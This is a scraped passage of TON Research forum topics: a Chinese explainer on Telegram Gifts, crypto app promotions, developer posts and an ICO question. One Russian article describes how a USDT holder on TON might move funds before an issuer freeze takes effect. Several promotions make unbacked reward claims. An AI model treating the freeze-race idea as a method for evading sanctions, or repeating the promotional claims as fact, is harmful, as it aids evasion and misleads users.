Gifts 在发布时就提到，未来计划支持将部分限量版礼物转换为 NFT（非同质化代币），然后在 2025 年 1 月发布了相关更新，将 Gifts 升级为“Collectible Gifts”（收藏礼物）。用户可以将收到的礼物升级为独一无二的收藏品，这些收藏品带有特殊属性（如背景颜色、图标和编号），并可转移给其他用户或在 NFT 市场上拍卖。

Gifts 分为普通版和限量版(Limited)，而其中限量版又可以升级为藏品(Collectible)，藏品可以进一步变成区块链上的 NFT。

[![image](https://tonresear.ch/uploads/default/optimized/3X/a/d/ad23b028d3d7723dd9edd3441195e98398ee8b99_2_653x500.jpeg)

image1056×808 76.7 KB

](https://tonresear.ch/uploads/default/original/3X/a/d/ad23b028d3d7723dd9edd3441195e98398ee8b99.jpeg "image")

## [](#p-67831-gifts-limited-gifts-3)![:gift:](https://tonresear.ch/images/emoji/twitter/gift.png?v=12 ":gift:") 普通 Gifts 和 ![:gift_heart:](https://tonresear.ch/images/emoji/twitter/gift_heart.png?v=12 ":gift_heart:") Limited Gifts 的区别

**![:gift:](https://tonresear.ch/images/emoji/twitter/gift.png?v=12 ":gift:")** 普通Gifts

*   没有数量上限
*   From 头像在左上角
*   不能 upgrade
*   7 天内可以换成 Stars （原价的80%）

![:gift_heart:](https://tonresear.ch/images/emoji/twitter/gift_heart.png?v=12 ":gift_heart:") Limited Gifts

*   设有数量上限（右上角有 Limited 标）
*   From 头像在左上角
*   右上角有 1 of nK 的标志
*   可以 upgrade (不可逆转)
*   7 天内可以换成 Stars （原价的80%）
*   upgrade 后可以 transfer (费用 25 Stars)
*   可以 transfer 给 联系人
*   21天后可以通过区块链进行 transfer ([Fragment.com](http://Fragment.com))
*   可作为独特的表情状态（emoji status）佩戴

## [](#p-67831-collectible-gifts-nft-gifts-4)![:framed_picture:](https://tonresear.ch/images/emoji/twitter/framed_picture.png?v=12 ":framed_picture:") ![:gem:](https://tonresear.ch/images/emoji/twitter/gem.png?v=12 ":gem:")Collectible Gifts 和 NFT Gifts 的区别

 **![:framed_picture:](https://tonresear.ch/images/emoji/twitter/framed_picture.png?v=12 ":framed_picture:") Collectible Gifts**

*   在 Telegram 里面
*   可以转给 Telegram 联系人

 **![:gem:](https://tonresear.ch/images/emoji/twitter/gem.png?v=12 ":gem:") NFT Gifts**

*   在 TON 区块链上
    
*   可以转给 TON 钱包
    
*   ![:books:](https://tonresear.ch/images/emoji/twitter/books.png?v=12 ":books:") 参考资料
    
    *   24-10-05 [Gifts, Verification Platform and More](https://telegram.org/blog/gifts-verification-platform)
    *   24-11-17 [Mini Apps 2.0: Full-Screen Mode, Home Screen Icons, Geolocation and 10 more features](https://telegram.org/blog/fullscreen-miniapps-and-more#gifts-from-apps)
    *   25-01-01 [Collectible Gifts, Message Search Filters and More](https://telegram.org/blog/collectible-gifts-and-more)
    *   25-01-24 [Wear Collectible Gifts, Move Gifts to the Blockchain, Send Gifts to Channels, and More](https://telegram.org/blog/wear-gifts-blockchain-and-more)
    *   [Lol Pop #106581 – Fragment](https://fragment.com/gift/lolpop-106581?collection=all&sort=price_asc&filter=sale)

# [](#p-67831-gifts-bot-api-5)三、关于 Gifts 的 Bot API

2024年 1 月 17 日，**Bot API 8.0 首次更新 Gifts 相关功能：**

*   Bot 可以接受用户支付 Stars 后发送 Gifts 给用户。
*   添加了类 [Gift](https://core.telegram.org/bots/api#gift) 和 [Gifts](https://core.telegram.org/bots/api#gifts) 以及方法 [getAvailableGifts](https://core.telegram.org/bots/api#getavailablegifts)，允许机器人获取所有可发送的礼物。
*   新增 [sendGift](https://core.telegram.org/bots/api#sendgift) 方法，允许 Bot 向用户发送礼物。(注意：bot 发送给用户的 gift 不能转为 Stars)
*   向类 [TransactionPartnerUser](https://core.telegram.org/bots/api#transactionpartneruser)(描述一个用户相关的交易) 添加了字段 _gift_。

**2025年 1 月 1 日 ，Bot API 8.2 更新 Gifts 可升级相关参数**

*   向 [类 Gift](https://core.telegram.org/bots/api#gift) 添加了字段 _upgrade\_star\_count_。
*   [sendGift](https://core.telegram.org/bots/api#sendgift) 方法中新增参数 _pay\_for\_upgrade_。(如果为 _True_ 则以从机器人的余额中支付礼物升级，从而使接收者可以免费升级)

**2025年 2 月 12 日 ，Bot API 8.3 更新可以向频道发送 Gift 的参数**

*   在 [sendGift](https://core.telegram.org/bots/api#sendgift) 方法中添加了参数 _chat\_id_，允许机器人向频道聊天发送礼物。
*   向类 [ChatFullInfo](https://core.telegram.org/bots/api#chatfullinfo) 添加了字段 _can\_send\_gift_。(如果为_True_，表示可以接受发送礼物)

终上所述，可以通过 bot 来管理 Gifts 做一些有意思的玩法，比如已经拥有 2 百多万用户的 “[Random Gift](https://t.me/randgift_bot?start=_tgr_YBsZJkliZThl)”，可以支付一定的 Stars 来抽取礼物。（可惜如 bot 接口说明，bot 发送的礼物无法转为 Stars）。

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41140

[TON Research](/)

# [ClickHub – the next-generation marketing social platform](/t/clickhub-the-next-generation-marketing-social-platform/41140)

[Application](/c/application/20) 

    

[ClickHub](https://tonresear.ch/u/ClickHub)  March 25, 2025, 11:50pm  1

[![Imgur](https://i.imgur.com/2hwrU25.png "imgur.com")](https://imgur.com/2hwrU25)

**What is ClickHub?**

ClickHub is a revolutionary marketing social platform where creators can **pay rewards for clicks on their promoted links** or **earn rewards by clicking on others’ links**

`ClickHub` is where **Creators** and **Clickers** meet

![:small_blue_diamond:](https://tonresear.ch/images/emoji/twitter/small_blue_diamond.png?v=12 ":small_blue_diamond:") **Creators**: Pay rewards to promote their links and get traffic.  
![:small_blue_diamond:](https://tonresear.ch/images/emoji/twitter/small_blue_diamond.png?v=12 ":small_blue_diamond:") **Clickers**: Earn rewards by clicking and engaging with links.

[\[Album\] imgur.com ![](https://i.imgur.com/bquYZA3.png?fb "imgur.com")](https://imgur.com/a/OzJvWgp) 

**ClickHub Features**

[\[Album\] imgur.com ![](https://i.imgur.com/Mv9uDkg.png?fb "imgur.com")](https://imgur.com/a/rgBiG3T) 

![:small_blue_diamond:](https://tonresear.ch/images/emoji/twitter/small_blue_diamond.png?v=12 ":small_blue_diamond:") Promote your products or services by rewarding clicks.  
![:small_blue_diamond:](https://tonresear.ch/images/emoji/twitter/small_blue_diamond.png?v=12 ":small_blue_diamond:") Earn rewards by engaging with promotional links.  
![:small_blue_diamond:](https://tonresear.ch/images/emoji/twitter/small_blue_diamond.png?v=12 ":small_blue_diamond:") Explore new and effective marketing opportunities.

**Official ClickHub Links ![:link:](https://tonresear.ch/images/emoji/twitter/link.png?v=12 ":link:")**   
Website : [clickhub.bot](https://clickhub.bot/)  
Channel : [t.me/theclickhub](https://t.me/theclickhub)  
X : [x.com/clickhubbot](https://x.com/clickhubbot)  
Community Chat : [t.me/clickhubchat](https://t.me/clickhubchat)  
Mini App : [t.me/clickhubbot/app](https://t.me/clickhubbot/app)

**Try ClickHub App ![:fire:](https://tonresear.ch/images/emoji/twitter/fire.png?v=12 ":fire:")** 

![](https://telegram.org/img/website_icon.svg?4) [Telegram](https://t.me/clickhubbot/app?startapp=ref_1598008267)

![](https://cdn5.cdn-telegram.org/file/qJKy66tPbTq28vkU3mTpqemhriICc3P6BDOrTePZe4jWtKP6OGBfPTOzDEG13O9o9LbJEV-6VP3G154G5eBFCHeoOe-tkFb3kATrYr-AWPRqMxZs_NC52lq64Equ0gpuKVSh5M7a_g4_ybUkDp51W_DcfTVzJ3TAqpW_fdOr31ZfvtiwqbQ6L2vYcBpULQEaJZQIs-MCgCe7N6GGNQyc_1yw04dpwu1BaL_NMed40sb7vF8kfo5YTr2f7WSVUkOUjhzDkvyOgzNcedXZrh1Kfg5owGGNLIRLwK85yJ-8FHnOlFC5if8GlARgZ4mEjSFKBuq4c_0eQb4lpva5Z0h-BQ.jpg)

### [ClickHub](https://t.me/clickhubbot/app?startapp=ref_1598008267)

ClickHub - pay per click & earn per click

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41224

[TON Research](/)

# [SentismAI is now live on Telegram - join the movement, earn Z Points daily, and shape the AI-native future](/t/sentismai-is-now-live-on-telegram-join-the-movement-earn-z-points-daily-and-shape-the-ai-native-future/41224)

[General](/c/general/4) 

    

[Polrare\_Contact](https://tonresear.ch/u/Polrare_Contact)  April 10, 2025, 7:03am  1

# [](#p-68035-sentismai-mini-app-all-in-one-web3-agent-hub-1)SentismAI Mini App - All-in-one Web3 Agent Hub

At Sentism, we believe that meaningful AI doesn’t start in a lab — it starts with people. With everyday choices, micro-interactions, and collective momentum.

That’s why we built the Sentism Mini App: a lightweight, reward-driven space where anyone can engage with AI, one Z Point at a time.

Whether exploring the ecosystem, inviting your network, or launching your first Agent, each action you take contributes to a more intelligent, more social AI layer.

## [](#p-68035-introducing-the-sentism-mini-app-2)Introducing the Sentism Mini App

Start now: [https://t.me/SentismAIBot/play…](https://t.co/oOs3bxsA9O?ref=blog.sentism.ai)

The Sentism Mini App is your entry point to the Sentism Layer — a social coordination layer for AI.

It’s designed for participation. From checking in daily to launching your own AI Agent, the Mini App enables you to:

*   ![:cyclone:](https://tonresear.ch/images/emoji/twitter/cyclone.png?v=12 ":cyclone:") **Check in every day** to earn 10Z and build your engagement streak
*   ![:brain:](https://tonresear.ch/images/emoji/twitter/brain.png?v=12 ":brain:") **Complete simple tasks** that deepen your connection to the ecosystem
*   ![:handshake:](https://tonresear.ch/images/emoji/twitter/handshake.png?v=12 ":handshake:") **Invite friends** and grow a network of aligned contributors
*   ![:gear:](https://tonresear.ch/images/emoji/twitter/gear.png?v=12 ":gear:") **Trade Z Points or deploy an Agent** right from within the app

Each action feels small, but collectively, it unlocks something far bigger — a network of people and machines evolving together.

## [](#p-68035-why-z-points-matter-3)Why Z Points Matter

Z Points aren’t just points — they’re your early contribution to a value layer in motion. Today, they represent your participation. But tomorrow?

Z Points will evolve into tokens, perks, and deeper levels of utility.  
They will power access, identity, and opportunity across the Sentism Layer.

Think of Z Points as proof-of-engagement — a lightweight, permissionless way to start building reputation and rewards inside a growing AI-native economy.

## [](#p-68035-participation-is-the-new-intelligence-4)Participation is the New Intelligence

You don’t need to write code. You don’t need to understand neural networks.  
All you need to do is show up.

The Sentism Mini App makes it simple to engage, earn, and learn — turning daily micro-interactions into long-term alignment with the future of AI.

This is how decentralized AI coordination begins:  
Not with complexity, but with participation.

## [](#p-68035-ready-to-start-5)Ready to Start?

The Mini App is live. The missions are active. The Z is waiting.

![:point_right:](https://tonresear.ch/images/emoji/twitter/point_right.png?v=12 ":point_right:") [Join now](https://t.me/SentismAIBot/play%E2%80%A6?ref=blog.sentism.ai) and shape the future — one action at a time.

Follow us for updates: [Website](https://sentism.ai/?ref=blog.sentism.ai) | [Whitepaper](https://docs.sentism.ai/?ref=blog.sentism.ai) | [Telegram](https://t.me/sentismai_chat?ref=blog.sentism.ai) | [X - SentismAI](https://x.com/Sentism_ai?ref=blog.sentism.ai) | [X - Zally](https://x.com/ZallyNFT?ref=blog.sentism.ai)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41301

[TON Research](/)

# [Проблема поиска работы и разработчиков](/t/topic/41301)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

    

[taiakin](https://tonresear.ch/u/taiakin)  April 23, 2025, 10:48pm  1

Хотел бы поделиться идеей. Она достаточно простая, но сообщество все еще нуждается в таком.

Часто в комьюнити вижу такие посты, как [этот](https://t.me/tmabuild/2466/34412) или [этот](https://t.me/alefmanv/158).

**Получается, что:**

![:small_blue_diamond:](https://tonresear.ch/images/emoji/twitter/small_blue_diamond.png?v=12 ":small_blue_diamond:")**Разработчики** не могут найти **работу**

![:small_blue_diamond:](https://tonresear.ch/images/emoji/twitter/small_blue_diamond.png?v=12 ":small_blue_diamond:")**Заказчики** не могут найти **FunC** **разработчика**

![:small_blue_diamond:](https://tonresear.ch/images/emoji/twitter/small_blue_diamond.png?v=12 ":small_blue_diamond:")Как следствие, **экосистема** **тормозит**

**Решение простое — я создал Telegram-группу, где можно:**

![:white_check_mark:](https://tonresear.ch/images/emoji/twitter/white_check_mark.png?v=12 ":white_check_mark:") **Размещать вакансии** и **резюме**

![:white_check_mark:](https://tonresear.ch/images/emoji/twitter/white_check_mark.png?v=12 ":white_check_mark:") Посты размещаются за звезды, что отсеивает спам и невдумчивые посты

![:white_check_mark:](https://tonresear.ch/images/emoji/twitter/white_check_mark.png?v=12 ":white_check_mark:") **Находить друг друга** без посторонних лиц

На биржах фрилансеры платят за отклики, но к тому же присутствует еще процент самой биржы с заказов.

Хотелось бы в экосистеме иметь больше таких “центров”, где люди могут найти контакт фрилансер - заказчик.

**Группа: [@ton\_vacancy](https://t.me/ton_vacancy)**

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41303

[TON Research](/)

# [Статья: Блокировки USDT в TON: есть ли уязвимость?](/t/usdt-ton/41303)

[Русский](/c/ru/49) 

    

[taiakin](https://tonresear.ch/u/taiakin)  April 23, 2025, 10:59pm  1

![:lock:](https://tonresear.ch/images/emoji/twitter/lock.png?v=12 ":lock:") **Блокировки USDT в TON: есть ли уязвимость?**

На EVM-блокчейнах Tether может заблокировать или даже изъять USDT с любого кошелька, если посчитает нужным. Это реализуется просто: токен управляется единым смарт-контрактом, и при необходимости в него вносятся изменения, блокирующие определенный адрес.

В TON механизм блокировки USDT тоже существует. Стандарт jetton wallet для USDT подписывается как «jetton wallet governed», что означает возможность внешнего управления. Однако процесс блокировки в TON работает иначе и, возможно, имеет уязвимость.

 **![:lock:](https://tonresear.ch/images/emoji/twitter/lock.png?v=12 ":lock:") Как происходит блокировка?**

**1**. Администратор Tether USDT отправляет команду в jetton master.

**2**. Jetton master пересылает команду в нужный jetton wallet.

**3**. Jetton wallet блокируется.

 **![:astonished:](https://tonresear.ch/images/emoji/twitter/astonished.png?v=12 ":astonished:") В чем проблема?**

Пока команда блокировки идет от jetton master к jetton wallet, владелец может быстро вывести токены:

— Перевести их на другой кошелек.

— Продать на DEX и выйти в TON.

Если jetton wallet находится в другом шарде, блокировка может стать еще менее эффективной. Из-за времени, необходимого для обработки межшардовых транзакций, злоумышленник получит еще больше шансов успеть перевести средства.

На данный момент прецедентов блокировки USDT в TON не было. Однако сам механизм вызывает вопросы.

Больше статей в [@dnevnik\_ton](https://t.me/dnevnik_ton)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41312

[TON Research](/)

# [Mintless Jetton: A Technical Analysis of TON’s Efficient Airdrop Protocol](/t/mintless-jetton-a-technical-analysis-of-ton-s-efficient-airdrop-protocol/41312)

[TON Blockchain](/c/ton-blockchain/17) 

[learn](https://tonresear.ch/tag/learn)

    

[TONX](https://tonresear.ch/u/TONX)  April 24, 2025, 1:08pm  1

> _You can see the original blog post [here](https://blog.tonx.ai/mintless-jetton-a-technical-analysis-of-tons-efficient-airdrop-protocol/)_

_Written By AndyHsu @ TONX ENG_

![](https://miro.medium.com/v2/resize:fit:933/1*xZyGt598g6whmlv9OQUb_Q.png)

# [](#p-68199-introduction-1)**Introduction**

In blockchain ecosystems, token airdrops serve as a common mechanism for token distribution and community engagement. However, traditional airdrop implementations face several significant challenges:

*   **High Transaction Costs**: Each airdrop recipient requires an individual minting transaction
*   **Network Scalability Issues**: Large-scale airdrops create network congestion
*   **Centralized Control Requirements**: Projects must maintain centralized distribution systems

These limitations create significant operational constraints for airdrop implementations, particularly for projects with large-scale user bases or limited resources.

# [](#p-68199-what-is-mintless-jetton-2)**What is Mintless Jetton?**

## [](#p-68199-solution-overview-3)**Solution Overview**

TON blockchain introduces Mintless Jetton, an innovative protocol that extends TEP-74 (TON Jettons Standard) through [TEP-177](https://github.com/ton-blockchain/TEPs/pull/177) (Mintless Jettons Standard) and [TEP-176](https://github.com/ton-blockchain/TEPs/pull/176) (Custom Payload Offchain Source for Jettons). The protocol enables efficient token distribution through Merkle proof verification, eliminating the need for individual minting transactions.

The protocol leverages cryptographic Merkle proofs to validate airdrop claims, significantly reducing operational costs while maintaining security and scalability.

## [](#p-68199-core-benefits-4)**Core Benefits**

*   **Cost Optimization**: Eliminates per-recipient minting transactions
*   **Enhanced Scalability**: Supports large-scale distributions without network congestion
*   **Cryptographic Security**: Implements tamper-proof claim verification via Merkle proofs with double-claim prevention
*   **Decentralized Architecture**: Removes dependency on centralized distribution systems

# [](#p-68199-technical-architecture-5)**Technical Architecture**

The Mintless Jetton protocol comprises two primary smart contracts and a Merkle tree verification system.

## [](#p-68199-core-contract-components-6)**Core Contract Components**

_**Jetton Minter Contract**_

*   Manages total token supply and minting operations
*   Stores Merkle root for airdrop verification
*   Handles administrative functions and contract upgrades
*   Maintains metadata URIs for Merkle dump and API endpoints

_**Jetton Wallet Contract**_

*   Manages individual user token balances
*   Processes token transfer operations
*   Implements airdrop verification and processing logic
*   Maintains wallet state (balance, owner address, and airdrop status)

## [](#p-68199-system-architecture-7)**System Architecture**

![](https://miro.medium.com/v2/resize:fit:933/1*x9moIQnw-OgW-iV9QDPXPw.png)

System Flow for Mintless Jetton Airdrop Claim

The Jetton Minter contract functions as the master contract, deterministically deriving and managing multiple Jetton Wallet contracts. Each wallet maintains its own isolated state while sharing a common Merkle root for airdrop verification. This one-to-many architecture enables scalable token distribution and efficient transfer operations across the network.

> _For more technical details and code demos, please read our [blog post](https://blog.tonx.ai/mintless-jetton-a-technical-analysis-of-tons-efficient-airdrop-protocol/)_

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41323

[TON Research](/)

# [Trying to launch an ICO, need advice](/t/trying-to-launch-an-ico-need-advice/41323)

[General](/c/general/4) 

    

[Muhammadreza\_Haghiri](https://tonresear.ch/u/Muhammadreza_Haghiri)  April 25, 2025, 4:29pm  1

I have some startup idea in mind and I also decided to make it more web3-ish. So one thing I can think of, is doing an ICO.  
Now I am here to ask some questions about the ICOs in general.  
Before going deep to my questions, I have to say although I like and studied technical aspects of the crypto world, I still do not understand a lot of mechanisms. So I’m deeply sorry if I seem a little bit like a dumb person here.  
Anyway, these are my questions:

1.  What should exactly be inside the _White Paper_ ? Introduction of the business? why we decided to go with the ICO? why you should pay us or something like this?
2.  Is it okay to point out that a part of money they pay is for development and a part is for liquidity? Let’s say you buy a single token for 0.01 dollars, 0.005 is the liquidity and 0.005 is for me.
3.  This is more about a liquidity pool rather than an ICO, I do not understand how they really work. I put the example here for STONfi dex, since it is where I personally do my exchanging (for TON based tokens). Consider I make a pool for “Example Coin” and I set one example coin is equal to 0.000001 TON coins. I already minted a million “Example Coins”, does it automatically detect the price? so the next person who is buying the token is going to pay one single ton coin for the whole million? I still do not understand this.
4.  In the marketing side, for current market people may show some interest in an ICO. But my question is for the times market is not this hot and also some bad things (like FTX) happened to people, or the times everything is good but crypto is also “just good” and not hot as it is today. What are the best marketing strategies for this?

Finally, if I get my answers and I manage to do a successful ICO, I personally will pay back the community by writing a full guide on what I did and how I did it, because I guess it will be useful for the next person like me who wants to do an ICO.

Best Regards  
M.H.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41343

[TON Research](/)

# [2 тон сайта на 1 серваке](/t/2-1/41343)

[Русский](/c/ru/49) 

    

[sarosema](https://tonresear.ch/u/sarosema)  April 28, 2025, 10:29am  1

Здравствуйте.

Нужна ваша помощь и совет, никак не получается запустить 2 тон сайта через daemon.

Вот настройки daemon

Первый сайт (не никаких проблем нет, работает все четко)

```
[Service]

ExecStart=/home/ton-build/rldp-http-proxy/rldp-http-proxy -a 99.99.99.999:3333 -R *@127.0.0.1:9991 -C /home/ton-build/global.config.json -A adnl

WorkingDirectory=/home/

User=root

Group=root

Environment="HOME=/root"

Restart=always

RestartSec=5

StandardOutput=syslog

StandardError=syslog

SyslogIdentifier=rldp-http-proxy-1

[Install]

WantedBy=multi-user.target
```

2 - второй

```
Service]

ExecStart=/home/ton-build/rldp-http-proxy/rldp-http-proxy -a 99.99.99.999:3333 -R *@127.0.0.1:9990 -C /home/ton-build/global.config.json -A adnl

WorkingDirectory=/home/

User=root

Group=root

Environment="HOME=/root"

Restart=always

RestartSec=5

StandardOutput=syslog

StandardError=syslog

SyslogIdentifier=rldp-http-proxy-2

[Install]

WantedBy=multi-user.target
```

Лог второого блока

```
pr 27 12:02:24 ubuntu-4gb-nbg1-3 rldp-http-proxy-2[789]: /home/ton-build/rldp-http-proxy/rldp-http-proxy(+0x119ea0)[0xca5e615d9ea0]

Apr 27 12:02:24 ubuntu-4gb-nbg1-3 rldp-http-proxy-2[789]: /lib/aarch64-linux-gnu/libc.so.6(+0x8595c)[0xee18be78595c]

Apr 27 12:02:24 ubuntu-4gb-nbg1-3 rldp-http-proxy-2[789]: /lib/aarch64-linux-gnu/libc.so.6(+0xeba4c)[0xee18be7eba4c]

Apr 27 12:02:24 ubuntu-4gb-nbg1-3 rldp-http-proxy-2[789]: -------------------------------

Apr 27 12:02:24 ubuntu-4gb-nbg1-3 systemd[1]: rldp-http-proxy-2.service: Main process exited, code=exited, status=1/FAILURE

Apr 27 12:02:24 ubuntu-4gb-nbg1-3 systemd[1]: rldp-http-proxy-2.service: Failed with result 'exit-code'.

Apr 27 12:02:34 ubuntu-4gb-nbg1-3 systemd[1]: rldp-http-proxy-2.service: Scheduled restart job, restart counter is at 1.

Apr 27 12:02:34 ubuntu-4gb-nbg1-3 systemd[1]: Started rldp-http-proxy-2.service - RLDP HTTP Proxy 2 (Port 9990).

Apr 27 12:02:34 ubuntu-4gb-nbg1-3 rldp-http-proxy-2[1036]: [ 0][t 7][2025-04-27 12:02:34.998993280][Status.h:273][!keyring] Unexpected Status [PosixError : No such file or directory : 2 : key not in db: File "./key>

Apr 27 12:02:35 ubuntu-4gb-nbg1-3 rldp-http-proxy-2[1036]: [pid 1036] [time 1745755354] Signal: 6
```

Пишет про keyring, но почему тогда первый сервис запускается а второй нет? Если ключи находятся вот тут /home/keyring и линковка на /root/keyring сделано  
\[/quote\]

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41440

[TON Research](/)

# [FunC Revolution: Two New Libraries — func-plus & func-kit](/t/func-revolution-two-new-libraries-func-plus-func-kit/41440)

[Technical Support](/c/technical-support/func-ts/84)  [FunC](/c/technical-support/func-ts/84) 

    

[SoftwareMaestro16](https://tonresear.ch/u/SoftwareMaestro16)  May 11, 2025, 6:29pm  1

![:ru:](https://tonresear.ch/images/emoji/twitter/ru.png?v=12 ":ru:") Для разработчиков, работающих с языком **FunC** — низкоуровневым языком программирования для создания смарт-контрактов в блокчейне **TON**, были представлены две новые библиотеки, значительно упрощающие процесс разработки.  
![:us:](https://tonresear.ch/images/emoji/twitter/us.png?v=12 ":us:") For developers working with **FunC**, the low-level programming language for creating smart contracts on the **TON blockchain**, two new libraries have been introduced to simplify and accelerate the development process.

 **![:package:](https://tonresear.ch/images/emoji/twitter/package.png?v=12 ":package:") func-plus**  
![:ru:](https://tonresear.ch/images/emoji/twitter/ru.png?v=12 ":ru:") Библиотека **func-plus** содержит набор готовых решений и вспомогательных функций, предназначенных для ускорения и стандартизации написания смарт-контрактов. При установке в проект автоматически добавляется файл updlib.fc, который можно использовать в своих контрактах .  
![:us:](https://tonresear.ch/images/emoji/twitter/us.png?v=12 ":us:") The **func-plus** library provides a set of pre-built utilities and helper functions aimed at streamlining smart contract development. When installed, it automatically adds a updlib.fc file to your project, containing reusable code snippets for common tasks.

 **![:package:](https://tonresear.ch/images/emoji/twitter/package.png?v=12 ":package:") func-kit**  
![:ru:](https://tonresear.ch/images/emoji/twitter/ru.png?v=12 ":ru:") Библиотека **func-kit** предназначена для быстрого добавления стандартных контрактов (например, jetton-minter.fc, jetton-wallet.fc, jetton-utils.fc) в структуру проекта. В зависимости от типа контракта, файлы автоматически помещаются либо в папку contracts, либо в contracts/imports, либо в корень проекта. Это позволяет легко интегрировать часто используемые компоненты и ускоряет старт новых проектов.  
![:us:](https://tonresear.ch/images/emoji/twitter/us.png?v=12 ":us:") The **func-kit** library allows developers to quickly integrate standard token contracts like jetton-minter.fc, jetton-wallet.fc, or jetton-utils.fc into their project. Depending on the contract type, the files are automatically added to either the contracts, contracts/imports, or the project root directory. This enables quick bootstrapping and reuse of essential components.

![:point_right:](https://tonresear.ch/images/emoji/twitter/point_right.png?v=12 ":point_right:") [**Watch on Youtube**](https://www.youtube.com/watch?v=-oenrejgsEc) ![:point_left:](https://tonresear.ch/images/emoji/twitter/point_left.png?v=12 ":point_left:")

_**Install via npm:**_

```
npm create func-plus@latest

npm create func-kit --help
npm create func-kit@latest jetton-minter
```

*   by [SoftwareMaestro](https://t.me/SoftwareMaestro)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41495

[TON Research](/)

# [Tolk Innovation: tolk-plus — The First Utility Library for Tolk Developers](/t/tolk-innovation-tolk-plus-the-first-utility-library-for-tolk-developers/41495)

[Technical Support](/c/technical-support/78) 

    

[SoftwareMaestro16](https://tonresear.ch/u/SoftwareMaestro16)  May 19, 2025, 5:39pm  1

![:ru:](https://tonresear.ch/images/emoji/twitter/ru.png?v=12 ":ru:") Для разработчиков, работающих с новым языком программирования **Tolk** — языком, созданным специально для разработки смарт-контрактов в блокчейне **TON**, была представлена новая библиотека, значительно упрощающая процесс разработки.  
![:us:](https://tonresear.ch/images/emoji/twitter/us.png?v=12 ":us:") For developers working with **Tolk**, the new programming language designed specifically for smart contract development on the **TON** blockchain, a new library has been introduced to simplify and accelerate the development process.

![:ru:](https://tonresear.ch/images/emoji/twitter/ru.png?v=12 ":ru:") Библиотека **tolk-plus** содержит набор готовых решений и вспомогательных функций, предназначенных для ускорения и стандартизации написания смарт-контрактов. При установке в проект автоматически добавляется файл updlib.tolk, который можно использовать в своих контрактах для типовых операций и утилит.

![:us:](https://tonresear.ch/images/emoji/twitter/us.png?v=12 ":us:") The **tolk-plus** library provides a set of pre-built utilities and helper functions aimed at streamlining smart contract development. When installed, it automatically adds an updlib.tolk file to your project, containing reusable code snippets for common operations.

![:point_right:](https://tonresear.ch/images/emoji/twitter/point_right.png?v=12 ":point_right:") [**Watch on Youtube**](https://www.youtube.com/watch?v=Sfi7vfyofiU&t=1s) ![:point_left:](https://tonresear.ch/images/emoji/twitter/point_left.png?v=12 ":point_left:")

_**Install via npm:**_

```
npm create tolk-plus@latest

```

*   by [SoftwareMaestro](https://t.me/SoftwareMaestro)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41550

[TON Research](/)

# [Notbitcoin – One Year of Building a Free Payment Solution on Telegram Mini App for the Community](/t/notbitcoin-one-year-of-building-a-free-payment-solution-on-telegram-mini-app-for-the-community/41550)

[Application](/c/application/20) 

    

[notbitco\_in](https://tonresear.ch/u/notbitco_in)   May 27, 2025, 4:16pm  1

[![image](https://tonresear.ch/uploads/default/optimized/3X/9/d/9d5a32612ab039e82ad808d7f185a8cdd2fb0513_2_690x388.jpeg)

image1600×900 56.1 KB

](https://tonresear.ch/uploads/default/original/3X/9/d/9d5a32612ab039e82ad808d7f185a8cdd2fb0513.jpeg "image")

# [](#p-68654-notbitcoin-one-year-of-building-a-free-payment-solution-on-telegram-mini-app-for-the-community-1)Notbitcoin – One Year of Building a Free Payment Solution on Telegram Mini App for the Community

Today, May 27, 2025, we at **Notbitcoin** proudly celebrate our first anniversary on the TON Blockchain. With a vision to build a simple and efficient peer-to-peer (P2P) payment ecosystem, as outlined in our whitepaper (notbitco.in/notbitcoin\_whitepaper\_v2.pdf), we have achieved significant milestones in our inaugural year. Through our **NBITPAY** application, detailed in our case study (notbitco.in/learn/casestudy), we have created a payment solution that serves the community, encourages idea contributions, and maintains transparency. Below are our key achievements in this journey.

## [](#p-68654-h-1-a-community-of-over-200000-users-on-telegram-mini-app-2)1\. A Community of Over 200,000 Users on Telegram Mini App

We have built a robust community with **over 200,000 miners** participating in the mining of our **$NBIT** token on the TON Blockchain. Our simple and accessible mining mechanism, integrated into the Telegram Mini App, enables everyone—from crypto enthusiasts to everyday users—to join the Notbitcoin ecosystem effortlessly. This milestone reflects our commitment to creating an open platform where the community is at the core and grows together.

## [](#p-68654-h-2-nbitpay-a-fee-free-high-speed-payment-application-3)2\. NBITPAY: A Fee-Free, High-Speed Payment Application

Our **NBITPAY** application, showcased in our case study (notbitco.in/learn/casestudy), exemplifies our efforts to simplify decentralized payments. With just a Telegram account and our **@nbitpaybot**, users can make transactions without creating a wallet, verifying bank accounts, or remembering complex passwords. To date, NBITPAY has processed **39,000 fee-free transactions**, each completed in just **0.01 seconds**, delivering a fast and cost-free payment experience. Many users have adopted NBITPAY QR codes in their stores to facilitate payments for goods and services, helping us build a growing payment community. We welcome ideas from the community to enhance NBITPAY, ensuring it meets real-world needs.

## [](#p-68654-h-3-developing-real-world-applications-for-nbit-through-partnerships-4)3\. Developing Real-World Applications for $NBIT Through Partnerships

